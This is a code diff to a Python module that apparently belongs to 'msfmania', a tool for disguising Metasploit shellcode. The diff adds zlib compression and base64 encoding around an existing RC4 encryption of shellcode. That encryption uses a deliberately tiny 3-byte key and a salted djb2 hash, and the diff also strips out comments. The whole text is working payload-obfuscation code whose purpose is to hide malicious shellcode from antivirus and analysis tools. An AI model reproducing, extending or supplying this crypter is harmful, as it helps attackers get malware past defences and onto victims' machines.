@@ -2,6 +2,8 @@ from msfmania import core
 from os import urandom
 from random import choice, randint
 from binascii import hexlify
+import zlib
+import base64
 
 
 class RC4:
@@ -35,23 +37,28 @@ class RC4:
 
 
 def shellcode_encryption(shellcode):
-    key = keygen_rc4()  # Generate RC4 key (3 characters)
+    key = keygen_rc4()
     
     shellcode_bytes = shellcode
     
     # Generate random salt for dynamic hash
-    salt = urandom(8)  # 8 bytes random salt
+    salt = urandom(8)
     
-    # Calculate djb2 hash of the payload + salt for dynamic result
+    # Calculate djb2 hash of the payload + salt
     payload_hash = djb2_hash(shellcode_bytes + salt)
+    
+    # Compress with zlib (level 9 = maximum compression)
+    compressed_shellcode = zlib.compress(shellcode_bytes, 9)
     
     # Encrypt with RC4
     rc4_cipher = RC4(key)
-    encrypted_shellcode = rc4_cipher.crypt(shellcode_bytes)
+    encrypted_shellcode = rc4_cipher.crypt(compressed_shellcode)
+    
+    # Encode to base64
+    b64_shellcode = base64.b64encode(encrypted_shellcode)
     
     # Convert to readable format
-    encrypted_shellcode_readable = readable(encrypted_shellcode)
-    # Convert hash to 4 bytes (little-endian) then to readable format
+    encrypted_shellcode_readable = readable(b64_shellcode)
     hash_bytes = payload_hash.to_bytes(4, byteorder='little')
     hash_readable = readable(hash_bytes)
     salt_readable = readable(salt)
@@ -61,19 +68,16 @@ def shellcode_encryption(shellcode):
 
 def keygen_rc4():
     """Generate RC4 key with 3 characters"""
-    key_length = 3  # 3 characters in key for RC4 encryption
-    key = bytes([randint(1, 255) for _ in range(key_length)])  # Avoid null bytes
+    key_length = 3
+    key = bytes([randint(1, 255) for _ in range(key_length)])
     return key
 
 
 def djb2_hash(data):
-    """
-    djb2 hash algorithm implementation
-    hash(i) = hash(i - 1) * 33 + str[i]
-    """
-    hash_value = 5381  # djb2 initial value
+    """djb2 hash algorithm implementation"""
+    hash_value = 5381
     for byte in data:
-        hash_value = ((hash_value * 33) + byte) & 0xFFFFFFFF  # Keep it 32-bit
+        hash_value = ((hash_value * 33) + byte) & 0xFFFFFFFF
     return hash_value
 
 
